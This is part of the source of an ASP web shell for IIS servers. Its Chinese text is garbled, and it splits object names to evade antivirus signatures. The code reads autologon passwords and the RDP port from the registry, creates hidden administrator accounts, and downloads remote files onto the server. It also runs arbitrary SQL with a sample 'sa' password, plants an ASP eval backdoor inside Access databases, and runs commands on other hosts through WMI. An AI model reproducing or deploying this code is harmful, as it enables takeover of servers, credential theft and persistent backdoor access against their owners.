			Case "getSiteRootInfo"
				getSiteRootInfo()
			Case "getTerminalInfo"
				getTerminalInfo()
		End Select
		
		echo "<hr/>"
	End Sub

	Sub getSrvInfo()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim i, sa, objWshSysEnv, aryExEnvList, strExEnvList, intCpuNum, strCpuInfo, strOS
		Set sa = Server.CreateObject("She"&T&"ll.Appl"&T&"ication")
		strExEnvList = "SystemRoot$WinDir$ComSpec$TEMP$TMP$NUMBER_OF_PROCESSORS$OS$Os2LibPath$Path$PATHEXT$PROCESSOR_ARCHITECTURE$" & _
					   "PROCESSOR_IDENTIFIER$PROCESSOR_LEVEL$PROCESSOR_REVISION"
		aryExEnvList = Split(strExEnvList, "$")
		
		Set objWshSysEnv = wsX.Environment("SYSTEM")
		chkErr(Err)

		intCpuNum = Request.ServerVariables("NUMBER_OF_PROCESSORS")
		If IsNull(intCpuNum) Or intCpuNum = "" Then
			intCpuNum = objWshSysEnv("NUMBER_OF_PROCESSORS")
		End If
		strOS = Request.ServerVariables("OS")
		If IsNull(strOS) Or strOS = "" Then
			strOS = objWshSysEnv("OS")
			strOs = strOs & "(�п����� Windows2003 Ŷ)"
		End If
		strCpuInfo = objWshSysEnv("PROCESSOR_IDENTIFIER")

		echo "<a href=javascript:showHideMe(srvInf);>��������ز���:</a>"
		echo "<ol id=srvInf><hr/>"
		echo "<li>��������: " & Request.ServerVariables("SERVER_NAME") & "</li>"
		echo "<li>������IP: " & Request.ServerVariables("LOCAL_ADDR") & "</li>"
		echo "<li>����˿�: " & Request.ServerVariables("SERVER_PORT") & "</li>"
		echo "<li>�������ڴ�: " & getTheSize(sa.GetSystemInformation("PhysicalMemoryInstalled")) & "</li>"
		echo "<li>������ʱ��: " & Now & "</li>"
		echo "<li>���������: " & Request.ServerVariables("SERVER_SOFTWARE") & "</li>"
		echo "<li>�ű���ʱʱ��: " & Server.ScriptTimeout & "</li>"
		echo "<li>������CPU����: " & intCpuNum & "</li>"
		echo "<li>������CPU����: " & strCpuInfo & "</li>"
		echo "<li>����������ϵͳ: " & strOS & "</li>"
		echo "<li>��������������: " & ScriptEngine & "/" & ScriptEngineMajorVersion & "." & ScriptEngineMinorVersion & "." & ScriptEngineBuildVersion & "</li>"
		echo "<li>���ļ�ʵ��·��: " & Request.ServerVariables("PATH_TRANeviloctalATED") & "</li>"
		echo "<hr/></ol>"
		
		echo "<br/><a href=javascript:showHideMe(srvEnvInf);>��������ز���:</a>"
		echo "<ol id=srvEnvInf><hr/>"
		For i = 0 To UBound(aryExEnvList)
			echo "<li>" & aryExEnvList(i) & ": " & wsX.ExpandEnvironmentStrings("%" & aryExEnvList(i) & "%") & "</li>"
		Next
		echo "<hr/></ol>"
		
		Set sa = Nothing
		Set objWshSysEnv = Nothing
	End Sub

	Sub getSrvDrvInfo()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim objTheDrive
		echo "<br/><a href=javascript:showHideMe(srvDriveInf);>������������Ϣ:</a>"
		echo "<ol id=srvDriveInf><hr/>"
		echo "<div id='fsoDriveList'>"
		echo "<span>�̷�</span><span>����</span><span>���</span><span>�ļ�ϵͳ</span><span>���ÿռ�</span><span>�ܿռ�</span><br/>"
		For Each objTheDrive In fsoX.Drives
			echo "<span>" & objTheDrive.DriveLetter & "</span>"
			echo "<span>" & getDriveType(objTheDrive.DriveType) & "</span>"
			If UCase(objTheDrive.DriveLetter) = "A" Then
				echo "<br/>"
			 Else
				echo "<span>" & objTheDrive.VolumeName & "</span>"
				echo "<span>" & objTheDrive.FileSystem & "</span>"
				echo "<span>" & getTheSize(objTheDrive.FreeSpace) & "</span>"
				echo "<span>" & getTheSize(objTheDrive.TotalSize) & "</span><br/>"
			End If
			If Err Then
				Err.Clear
				echo "<br/>"
			End If
		Next
		echo "</div><hr/></ol>"
		Set objTheDrive = Nothing
	End Sub
	
	Sub getSiteRootInfo()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim objTheFolder
		Set objTheFolder = fsoX.GetFolder(Server.MapPath("/"))
		echo "<br/><a href=javascript:showHideMe(siteRootInfo);>վ���Ŀ¼��Ϣ:</a>"
		echo "<ol id=siteRootInfo><hr/>"
		echo "<li>����·��: " & Server.MapPath("/") & "</li>"
		echo "<li>��ǰ��С: " & getTheSize(objTheFolder.Size) & "</li>"
		echo "<li>�ļ���: " & objTheFolder.Files.Count & "</li>"
		echo "<li>�ļ�����: " & objTheFolder.SubFolders.Count & "</li>"
		echo "<li>��������: " & objTheFolder.DateCreated & "</li>"
		echo "<li>����������: " & objTheFolder.DateLastAccessed & "</li>"
		echo "</ol>"
	End Sub
	
	Sub getTerminalInfo()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim terminalPortPath, terminalPortKey, termPort
		Dim autoLoginPath, autoLoginUserKey, autoLoginPassKey
		Dim isAutoLoginEnable, autoLoginEnableKey, autoLoginUsername, autoLoginPassword

		terminalPortPath = "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
		terminalPortKey = "PortNumber"
		termPort = wsX.RegRead(terminalPortPath & terminalPortKey)

		echo "�ն˷���˿ڼ��Զ���¼��Ϣ<hr/><ol>"
		If termPort = "" Or Err.Number <> 0 Then 
			echo  "�޷��õ��ն˷���˿�, ����Ȩ���Ƿ��Ѿ��ܵ�����.<br/>"
		 Else
			echo  "��ǰ�ն˷���˿�: " & termPort & "<br/>"
		End If
		
		autoLoginPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
		autoLoginEnableKey = "AutoAdminLogon"
		autoLoginUserKey = "DefaultUserName"
		autoLoginPassKey = "DefaultPassword"
		isAutoLoginEnable = wsX.RegRead(autoLoginPath & autoLoginEnableKey)
		If isAutoLoginEnable = 0 Then
			echo  "ϵͳ�Զ���¼����δ����<br/>"
		Else
			autoLoginUsername = wsX.RegRead(autoLoginPath & autoLoginUserKey)
			echo  "�Զ���¼��ϵͳ�ʻ�: " & autoLoginUsername & "<br>"
			autoLoginPassword = wsX.RegRead(autoLoginPath & autoLoginPassKey)
			If Err Then
				Err.Clear
				echo  "False"
			End If
			echo  "�Զ���¼���ʻ�����: " & autoLoginPassword & "<br>"
		End If
		echo "</ol>"
	End Sub

	Sub PageLogin()
		Dim theAct, passWord
		theAct = Request("theAct")
		passWord = Request("userPassword")
		
		showTitle("�����¼")
		
		If theAct = "chkLogin" Then
			If passWord = userPassword Then
				Session(m & "userPassword") = passWord
				redirectTo("?eviloctal=PageList")
			 Else
				echo "<script language=javascript>alert('��Ҫ����Ŷ');history.back();</script>"
			End If
		End If
		
		echo "<style>body{margin:8;text-align:center;}</style>"
		echo "TTFCTȫ���ܰ�<hr/>"
		echo "<body onload=document.forms[0].userPassword.focus();>"
		echo "<form method=post onsubmit=this.Submit.disabled=true;>"
		echo "<input name=userPassword class=input type=password size=30> "
		echo "<input type=hidden name=theAct value=chkLogin>"
		echo "<input type=submit name=Submit value=""" & HtmlEncode(myName) & """ class=input>"
		echo "<hr/>"
                echo "</form>"
		echo "<body>"
		
	End Sub

	Sub pageMsDataBase()
		Dim theAct, sqlStr
		theAct = Request("theAct")
		sqlStr = Request("sqlStr")
		
		showTitle("mdb+mssql���ݿ����ҳ")
		
		If sqlStr = "" Then
			If Session(m & "sqlStr") = "" Then
				sqlStr = "e:\eviloctalTop.mdb��sql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;"
			 Else
				sqlStr = Session(m & "sqlStr")
			End If
		End If
		Session(m & "sqlStr") = sqlStr
		
		echo "<style>body{margin:8;}</style>"
		echo "<form method=post action='?eviloctal=MsDataBase&theAct=showTables' onSubmit='this.Submit.disabled=true;'>"
		echo "<a href='?eviloctal=MsDataBase'>mdb+mssql���ݿ����</a><br/>"
		echo "<input name=sqlStr type=text id=sqlStr value=""" & sqlStr & """ size=60 style='width:80%;'>"
		echo "<input name=theAct type=hidden value=showTables><br/>"
		echo "<input type=Submit name=Submit value=' �ύ '>"
		echo "<input type=button name=Submit2 value=' ���� ' onclick=""if(confirm('��������ACESS���������ASP\nĬ��������" & clientPassword & "\n��������ʹ�õ�ǰ����\n���ݿ���asp��׺, ����û�д���asp����\nȷ�ϲ�����?')){location.href='?eviloctal=MsDataBase&theAct=inject&sqlStr='+this.form.sqlStr.value;this.disabled=true;}"">"
		echo "<input type=button value=' ʾ�� ' onclick=""this.form.sqlStr.value='e:\\eviloctalTop.mdb��sql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;';"">"
		echo "</form>"
		echo "<hr/>ע: ����ֻ���ACCESS����, Ҫ���ACCESS�ڱ��е�д����""d:\bbs.mdb"", SQL�ݿ�д����""sql:�����ַ���"", ��Ҫ��дsql:��<hr/>"

		Select Case theAct
			Case "showTables"
				showTables()
			Case "query"
				showQuery()
			Case "inject"
				accessInject()
		End Select
		
		echo ""
	End Sub
	
	Sub showTables()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim conn, sqlStr, rsTable, rsColumn, connStr, tablesStr
		sqlStr = Request("sqlStr")
		If LCase(Left(sqlStr, 4)) = "sql:" Then
			connStr = Mid(sqlStr, 5)
		 Else
			connStr = "Provider=Microsoft.Jet.Oledb.4.0;Data Source=" & sqlStr
		End If
		Set conn = Server.CreateObject("ADO"&T&"DB.Conne"&T&"ction")
		
		conn.Open connStr
		chkErr(Err)
		
		tablesStr = getTableList(conn, sqlStr, rsTable)
		
		echo "<a href=""?eviloctal=MsDataBase&theAct=showTables&sqlStr=" & UrlEncode(sqlStr)  & """>���ݿ��ṹ�鿴:</a><br/>"
		echo tablesStr & "<hr/>"
		echo "<a href=""?eviloctal=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & """>ת��SQL����ִ��</a><hr/>"

		Do Until rsTable.Eof
			Set rsColumn = conn.OpenSchema(4, Array(Empty, Empty, rsTable("Table_Name").value))
			echo "<table border=0 cellpadding=0 cellspacing=0><tr><td height=22 colspan=6><b>" & rsTable("Table_Name") & "</b></td>"
			echo "</tr><tr><td colspan=6><hr/></td></tr><tr align=center>"
			echo "<td>�ֶ���</td><td>����</td><td>��С</td><td>����</td><td>����Ϊ��</td><td>Ĭ��ֵ</td></tr>"
			echo "<tr><td colspan=6><hr/></td></tr>"

			Do Until rsColumn.Eof
				echo "<tr align=center>"
				echo "<td align=Left>&nbsp;" & rsColumn("Column_Name") & "</td>"
				echo "<td width=80>" & getDataType(rsColumn("Data_Type")) & "</td>"
				echo "<td width=70>" & rsColumn("Character_Maximum_Length") & "</td>"
				echo "<td width=70>" & rsColumn("Numeric_Precision") & "</td>"
				echo "<td width=70>" & rsColumn("Is_Nullable") & "</td>"
				echo "<td width=80>" & rsColumn("Column_Default") & "</td>"
				echo "</tr>"
				rsColumn.MoveNext
			Loop
			
			echo "<tr><td colspan=6><hr/></td></tr></table>"
			rsTable.MoveNext
		Loop

		echo "<hr/>"

		conn.Close
		Set conn = Nothing
		Set rsTable = Nothing
		Set rsColumn = Nothing
	End Sub
	
	Sub showQuery()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim i, j, rs, sql, page, conn, sqlStr, connStr, rsTable, tablesStr, theTable
		sql = Request("sql")
		page = Request("page")
		sqlStr = Request("sqlStr")
		theTable = Request("theTable")
		
		If Not IsNumeric(page) or page = "" Then
			page = 1
		End If
		
		If sql = "" And theTable <> "" Then
			sql = "Select top " & dbSelectNumber & " * from [" & theTable & "]"
		End If
		
		If LCase(Left(sqlStr, 4)) = "sql:" Then
			connStr = Mid(sqlStr, 5)
		 Else
			connStr = "Provider=Microsoft.Jet.Oledb.4.0;Data Source=" & sqlStr
		End If
		Set rs = Server.CreateObject("Adodb.RecordSet")
		Set conn = Server.CreateObject("ADO"&T&"DB.Conne"&T&"ction")
	
		conn.Open connStr
		chkErr(Err)
		
		tablesStr = getTableList(conn, sqlStr, rsTable)

		echo "<a href=""?eviloctal=MsDataBase&theAct=showTables&sqlStr=" & UrlEncode(sqlStr)  & """>���ݿ��ṹ�鿴:</a><br/>"
		echo tablesStr & "<hr/>"
		echo "<a href=?eviloctal=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & "&sql=" & UrlEncode(sql) & ">SQL����ִ�м��鿴</a>"
		echo "<br/><form method=post action=""?eviloctal=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & """>"
		echo "<input name=sql type=text id=sql value=""" & HtmlEncode(sql) & """ size=60>"
		echo "<input type=Submit name=Submit4 value=ִ�в�ѯ><hr/>"

		If sql <> "" And Left(LCase(sql), 7) = "select " Then
			rs.Open sql, conn, 1, 1
			chkErr(Err)
			rs.PageSize = 20
			If Not rs.Eof Then
				rs.AbsolutePage = page
			End If
			If rs.Fields.Count>0 Then
				echo "<br><table border=""1"" cellpadding=""0"" cellspacing=""0"" width=""98%"">"
				echo "<tr>"
				echo "<td height=""22"" align=""center"" class=""tr"" colspan=""" & rs.Fields.Count & """>SQL���� - ִ�н��</td>"
				echo "</tr>"
				echo "<tr>"
				For j = 0 To rs.Fields.Count-1
					echo "<td height=""22"" align=""center"" class=""td""> " & rs.Fields(j).Name & " </td>"
				Next
				For i = 1 To 20
					If rs.Eof Then
						Exit For
					End If
					echo "</tr>"
					echo "<tr valign=top>"
					For j = 0 To rs.Fields.Count-1
						echo "<td height=""22"" align=""center"">" & HtmlEncode(fixNull(rs(j))) & "</td>"
					Next
					echo "</tr>"
					rs.MoveNext
				Next
			End If
			echo "<tr>"
			echo "<td height=""22"" align=""center"" class=""td"" colspan=""" & rs.Fields.Count & """>"
			For i = 1 To rs.PageCount
				echo Replace("<a href=""?eviloctal=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & "&sql=" & UrlEncode(sql) & "&page=" & i & """><font {$font" & i & "}>" & i & "</font></a> ", "{$font" & page & "}", "class=warningColor")
			Next
			echo "</td></tr></table>"
			rs.Close
		 Else
		 	If sql <> "" Then
				conn.Execute(sql)
				chkErr(Err)
				echo "<center><br>ִ�����!</center>"
			End If
		End If

		echo "</form><hr/>"

		conn.Close
		Set rs = Nothing
		Set conn = Nothing
		Set rsTable = Nothing
	End Sub
	
	Function getDataType(typeId)
		Select Case typeId
			Case 130
				getDataType = "�ı�"
			Case 2
				getDataType = "����"
			Case 3
				getDataType = "������"
			Case 7
				getDataType = "����/ʱ��"
			Case 5
				getDataType = "˫������"
			Case 11
				getDataType = "��/��"
			Case 128
				getDataType = "OLE ����"
			Case Else
				getDataType = typeId
		End Select
	End Function
	
	Sub accessInject()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim rs, conn, sqlStr, connStr
		sqlStr = Request("sqlStr")
		If LCase(Left(sqlStr, 4)) = "sql:" Then
			showErr("����ֻ��ACCESS���ݿ���Ч!")
		 Else
			connStr = "Provider=Microsoft.Jet.Oledb.4.0;Data Source=" & sqlStr
		End If
		Set rs = Server.CreateObject("Adodb.RecordSet")
		Set conn = Server.CreateObject("ADO"&T&"DB.Conne"&T&"ction")

		conn.Open connStr
		chkErr(Err)

		If notdownloadsExists = True Then
			conn.Execute("drop table notdownloads")
		End If

		conn.Execute("create table notdownloads(notdownloads oleobject)")

		rs.Open "notdownloads", conn, 1, 3
		rs.AddNew
		rs("notdownloads").AppendChunk(ChrB(Asc("<")) & ChrB(Asc("%")) & ChrB(Asc("e")) & ChrB(Asc("x")) & ChrB(Asc("e")) & ChrB(Asc("c")) & ChrB(Asc("u")) & ChrB(Asc("t")) & ChrB(Asc("e")) & ChrB(Asc("(")) & ChrB(Asc("r")) & ChrB(Asc("e")) & ChrB(Asc("q")) & ChrB(Asc("u")) & ChrB(Asc("e")) & ChrB(Asc("s")) & ChrB(Asc("t")) & ChrB(Asc("(")) & ChrB(Asc("""")) & ChrB(Asc(clientPassword)) & ChrB(Asc("""")) & ChrB(Asc(")")) & ChrB(Asc(")")) & ChrB(Asc("%")) & ChrB(Asc(">")) & ChrB(Asc(" ")))
	    rs.Update
    	rs.Close
		
		echo "<script language=""javascript"">alert('����ɹ�!');history.back();</script>"
		
		conn.Close
		Set rs = Nothing
		Set conn = Nothing
	End Sub
	
	Function getTableList(conn, sqlStr, rsTable)
		Set rsTable = conn.OpenSchema(20, Array(Empty, Empty, Empty, "table"))

		Do Until rsTable.Eof
			getTableList = getTableList & "<a href=""?eviloctal=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & "&theTable=" & UrlEncode(rsTable("Table_Name")) & """>[" & rsTable("Table_Name") & "]</a>&nbsp;"
			rsTable.MoveNext
		Loop
		rsTable.MoveFirst
	End Function

	Sub PageObjOnSrv()
		Dim i, objTmp, txtObjInfo, strObjectList, strDscList
		txtObjInfo = Trim(Request("txtObjInfo"))

		strObjectList = "MSWC.AdRotator,MSWC.BrowserType,MSWC.NextLink,MSWC.Tools,MSWC.Status,MSWC.Counters,IISSample.ContentRotator," & _
						"IISSample.PageCounter,MSWC.PermissionChecker,ADO"&T&"DB.Conne"&T&"ction,SoftArtisans.FileUp,SoftArtisans.FileManager,LyfUpload.UploadFile," & _
						"Persits.Upload.1,W3.Upload,JMail.SmtpMail,CDONTS.NewMail,Persits.MailSender,SMTPsvg.Mailer,DkQmail.Qmail,Geocel.Mailer," & _
						"IISmail.Iismail.1,SmtpMail.SmtpMail.1,SoftArtisans.ImageGen,W3Image.Image," & _
						"Scripting.FileSystemObject,Adodb.Stream,She"&T&"ll.Appl"&T&"ication,WScri"&T&"pt.She"&T&"ll,Wscript.Network"
		strDscList = "����ֻ�,�������Ϣ,�������ӿ�,,,������,��������,,Ȩ�޼��,ADO ���ݶ���,SA-FileUp �ļ��ϴ�,SoftArtisans �ļ�����," & _
					 "���Ʒ���ļ��ϴ����,ASPUpload �ļ��ϴ�,Dimac �ļ��ϴ�,Dimac JMail �ʼ��շ�,���� SMTP ����,ASPemail ����,ASPmail ����,dkQmail ����," & _
					 "Geocel ����,IISmail ����,SmtpMail ����,SA ��ͼ���д,Dimac ��ͼ���д���," & _
					 "FSO,Stream ��,,,"

		aryObjectList = Split(strObjectList, ",")
		aryDscList = Split(strDscList, ",")

		showTitle("���������֧��������")

		echo "�������֧��������<br/>"
		echo "��������������������Ҫ���������ProgId��ClassId��<br/>"
		echo "<form method=post>"
		echo "<input name=txtObjInfo size=30 value=""" & txtObjInfo & """><input name=theAct type=submit value=��Ҫ���>"
		echo "</form>"

		If Request("theAct") = "��Ҫ���" And txtObjInfo <> "" Then
			Call getObjInfo(txtObjInfo, "")
		End If
		
		echo "<hr/>"
		echo "<lu>������� �� ֧�ּ�����"

		For i = 0 To UBound(aryDscList)
			Call getObjInfo(aryObjectList(i), aryDscList(i))
		Next

		echo "</lu><hr/>"		
	End Sub
	
	Sub getObjInfo(strObjInfo, strDscInfo)
		Dim objTmp

		If isDebugMode = False Then
			On Error Resume Next
		End If

		echo "<li> " & strObjInfo
		If strDscInfo <> "" Then
			echo " (" & strDscInfo & "���)"
		End If

		echo " �� "

		Set objTmp = Server.CreateObject(strObjInfo)
		If Err <> -2147221005 Then
			echo "�� "
			echo "Version: " & objTmp.Version & "; "
			echo "About: " & objTmp.About
		 Else
			echo "��"
		End If
		echo "</li>"

		If Err Then
			Err.Clear
		End If
		
		Set objTmp = Nothing
	End Sub

	Sub PageOtherTools()
		Dim theAct
		theAct = Request("theAct")

		showTitle("һЩ�����С����")

		Select Case theAct
			Case "downFromUrl"
				downFromUrl()
				Response.End
			Case "addUser"
				AddUser Request("userName"), Request("passWord")
				Response.End
			Case "readReg"
				readReg()
				Response.End
		End Select

		echo "����ת��:<hr/>"
		echo "<input name=text1 value=�ַ�������ת10��16���� size=25 id=text9>"
		echo "<input type=button onclick=main(); value=����ת>"
		echo "<input value=16����ת10���ƺ��ַ� size=25 id=vars>"
		echo "<input type=button onClick=main2(); value=����ת>"
		echo "<hr/>"
		
		echo "���ص�������:<hr/>"
		echo "<form method=post target=_blank>"
		echo "<input name=theUrl value='http://' size=80><input type=submit value=' ���� '><br/>"
		echo "<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=80>"
		echo "<input type=checkbox name=overWrite value=2>���ڸ���"
		echo "<input type=hidden value=downFromUrl name=theAct>"
		echo "</form>"
		echo "<hr/>"
		
		echo "�ļ��༭:<hr/>"
		echo "<form method=post action='?' target=_blank>"
		echo "<input size=80 name=thePath value=""" & HtmlEncode(Request.ServerVariables("PATH_TRANeviloctalATED")) & """>"
		echo "<input type=hidden value=showEdit name=theAct>"
		echo "<select name=eviloctal><option value=AppFileExplorer>��Stream</option><option value=FsoFileExplorer>��FSO</option></select>"
		echo "<input type=submit value=' �� '>"
		echo "</form><hr/>"
		
		echo "�����ʺ����(�ɹ��ʼ���):<hr/>"
		echo "<form method=post target=_blank>"
		echo "<input type=hidden value=addUser name=theAct>"
		echo "<input name=userName value='eviloctalTop' size=39>"
		echo "<input name=passWord type=password value='eviloctalTop' size=39>"
		echo "<input type=submit value=' ��� '>"
		echo "</form><hr/>"
		
		echo "ע����ֵ��ȡ(<a href=javascript:showHideMe(regeditInfo);>����</a>):<hr/>"
		echo "<form method=post target=_blank>"
		echo "<input type=hidden value=readReg name=theAct>"
		echo "<input name=thePath value='HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName' size=80>"
		echo "<input type=submit value=' ��ȡ '>"
		echo "<span id=regeditInfo style='display:none;'><hr/>"
		echo "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\Dont-DisplayLastUserName,REG_SZ,1 {����ʾ�ϴε�¼�û�}<br/>"
		echo "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\restrictanonymous,REG_DWORD,0 {0=ȱʡ,1=�����û��޷��оٱ����û��б�,2=�����û��޷����ӱ���IPC$����}<br/>"
		echo "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\AutoShareServer,REG_DWORD,0 {��ֹĬ�Ϲ���}<br/>"
		echo "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\EnableSharedNetDrives,REG_SZ,0 {�ر����繲��}<br/>"
		echo "HKLM\SYSTEM\currentControlSet\Services\Tcpip\Parameters\EnableSecurityFilters,REG_DWORD,1 {����TCP/IPɸѡ(����������)}<br/>"
		echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\IPEnableRouter,REG_DWORD,1 {����IP·��}<br/>"
		echo "-------�����ƺ�Ҫ���󶨵�����,��֪���Ƿ�׼ȷ---------<br/>"
		echo "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\DefaultGateway,REG_MUTI_SZ {Ĭ������}<br/>"
		echo "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\NameServer {��DNS}<br/>"
		echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\TCPAllowedPorts {�����TCP/IP�˿�}<br/>"
		echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\UDPAllowedPorts {�����UDP�˿�}<br/>"
		echo "-----------OVER--------------------<br/>"
		echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Enum\Count {����������}<br/>"
		echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Linkage\Bind {��ǰ����������(��������滻)}<br/>"
		echo "==========================================================<br/>����������kEvin1986�ṩ"
		echo "</span>"
		echo "</form><hr/>"
		
		echo "<script language=vbs>" & vbNewLine
		echo "sub main()" & vbNewLine
		echo "base=document.all.text9.value" & vbNewLine
		echo "If IsNumeric(base) Then" & vbNewLine
		echo "cc=hex(cstr(base))" & vbNewLine
		echo "alert(""10����Ϊ""&base)" & vbNewLine
		echo "alert(""16����Ϊ""&cc)" & vbNewLine
		echo "exit sub" & vbNewLine
		echo "end if" & vbNewLine
		echo "aa=asc(cstr(base))" & vbNewLine
		echo "bb=hex(aa)" & vbNewLine
		echo "alert(""10����Ϊ""&aa)" & vbNewLine
		echo "alert(""16����Ϊ""&bb)" & vbNewLine
		echo "end sub" & vbNewLine
		echo "sub main2()" & vbNewLine
		echo "If document.all.vars.value<>"""" Then" & vbNewLine
		echo "Dim nums,tmp,tmpstr,i" & vbNewLine
		echo "nums=document.all.vars.value" & vbNewLine
		echo "nums_len=Len(nums)" & vbNewLine
		echo "For i=1 To nums_len" & vbNewLine
		echo "tmp=Mid(nums,i,1)" & vbNewLine
		echo "If IsNumeric(tmp) Then" & vbNewLine
		echo "tmp=tmp * 16 * (16^(nums_len-i-1))" & vbNewLine
		echo "Else" & vbNewLine
		echo "If ASC(UCase(tmp))<65 Or ASC(UCase(tmp))>70 Then" & vbNewLine
		echo "alert(""���������ֵ���зǷ��ַ���16������ֻ����1��9��a��f֮����ַ������������롣"")" & vbNewLine
		echo "exit sub" & vbNewLine
		echo "End If" & vbNewLine
		echo "tmp=(ASC(UCase(tmp))-55) * (16^(nums_len-i))" & vbNewLine
		echo "End If" & vbNewLine
		echo "tmpstr=tmpstr+tmp" & vbNewLine
		echo "Next" & vbNewLine
		echo "alert(""ת����10����Ϊ:""&tmpstr&""���ַ�ֵΪ:""&chr(tmpstr))" & vbNewLine
		echo "End If" & vbNewLine
		echo "end sub" & vbNewLine
		echo "</script>" & vbNewLine

		echo ""
	End Sub
	
	Sub downFromUrl()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim Http, theUrl, thePath, stream, fileName, overWrite
		theUrl = Request("theUrl")
		thePath = Request("thePath")
		overWrite = Request("overWrite")
		Set stream = Server.CreateObject("Adodb.Stream")
		Set Http = Server.CreateObject("MSXML2.XMLHTTP")
		
		If overWrite <> 2 Then
			overWrite = 1
		End If
		
		Http.Open "GET", theUrl, False
		Http.Send()
		If Http.ReadyState <> 4 Then 
			Exit Sub
		End If
		
		With stream
			.Type = 1
			.Mode = 3
			.Open
			.Write Http.ResponseBody
			.Position = 0
			.SaveToFile thePath, overWrite
			If Err.Number = 3004 Then
				Err.Clear
				fileName = Split(theUrl, "/")(UBound(Split(theUrl, "/")))
				If fileName = "" Then
					fileName = "index.htm.txt"
				End If
				thePath = thePath & "\" & fileName
				.SaveToFile thePath, overWrite
			End If
			.Close
		End With
		chkErr(Err)
		
		alertThenClose("�ļ� " & Replace(thePath, "\", "\\") & " ���سɹ�!")
		
		Set Http = Nothing
		Set Stream = Nothing
	End Sub
	
	Sub AddUser(strUser, strPassword)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim computer, theUser, theGroup
		Set computer = Getobject("WinNT://.")
		Set theGroup = GetObject("WinNT://./Administrators,group")
		
		Set theUser = computer.Create("User", strUser)
		theUser.SetPassword(strPassword)
		chkErr(Err)
		theUser.SetInfo
		chkErr(Err)
		theGroup.Add theUser
		chkErr(Err)
		
		Set theUser = Nothing
		Set computer = Nothing
		Set theGroup = Nothing
		
		echo getUserInfo(strUser)
	End Sub
	
	Sub readReg()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim i, thePath, theArray
		thePath = Request("thePath")
'		echo thePath & "<br/>"
		theArray = wsX.RegRead(thePath)
		If IsArray(theArray) Then
			For i = 0 To UBound(theArray)
				echo "<li>" & theArray(i)
			Next
		 Else
			echo "<li>" & theArray
		End If
		chkErr(Err)
	End Sub

Sub mycom()
echo "<form name=""form1"" method=""post"" action=""?eviloctal=mycom"">"
echo "  Զ��ִ������"
echo "<input name=""ok"" type=""text"" id=""ok"" value=""&quot;192.168.2.1&quot;,&quot;root/cimv2&quot;,&quot;administrator&quot;,&quot;xiaolu&quot;"" size=""70"">"
echo "  <input type=""submit"" name=""Submit"" value=""�ύ"">"
echo "</form>"
if request("ok")<>"" then
set ww=server.createobject("wbemscripting.swbemlocator")
set cc=ww.connectserver(request("ok"))
set ss=cc.get("Win32_ProcessStartup")
Set oC=ss.SpawnInstance_
oC.ShowWindow=12
Set pp=cc.get("Win32_Process")
Response.Write pp.create("net user",null,oC,intProcessID)
Response.Write "<br>"&intProcessID
Response.end
end if
end sub



	Sub PageList()
		showTitle("����ģ���б�")

		echo "<base target=_blank>"
		echo "TTFCT��ǿ��<hr/>"
		echo "<ol><li><a href='?eviloctal=ServiceList'>ϵͳ������Ϣ</a></li>"
		echo "<br/>"
		echo "<li><a href='?eviloctal=infoAboutSrv'>�������������</a><br/>("
		echo "<a href='?eviloctal=infoAboutSrv&theAct=getSrvInfo'>ϵͳ����</a>,"
		echo "<a href='?eviloctal=infoAboutSrv&theAct=getSrvDrvInfo'>ϵͳ����</a>,"
		echo "<a href='?eviloctal=infoAboutSrv&theAct=getSiteRootInfo'>վ���ļ���</a>,"
		echo "<a href='?eviloctal=infoAboutSrv&theAct=getTerminalInfo'>�ն˶˿�&�Զ���¼</a>)</li>"
		echo "<li><a href='?eviloctal=objOnSrv'>���������̽��</a></li>"
		echo "<li><a href='?eviloctal=userList'>ϵͳ�û����û�����Ϣ</a></li>"
		echo "<li><a href='?eviloctal=CSInfo'>�ͻ��˷�����������Ϣ</a></li>"
		echo "<li><a href='?eviloctal=WsCmdRun'>WScri"&T&"pt.She"&T&"ll����������</a></li>"
		echo "<li><a href='?eviloctal=SaCmdRun'>She"&T&"ll.Appl"&T&"ication����������</a></li>"
		echo "<li><a href='?eviloctal=FsoFileExplorer'>FSO�ļ����������</a></li>"
		echo "<li><a href='?eviloctal=AppFileExplorer'>She"&T&"ll.Appl"&T&"ication�ļ����������</a></li>"
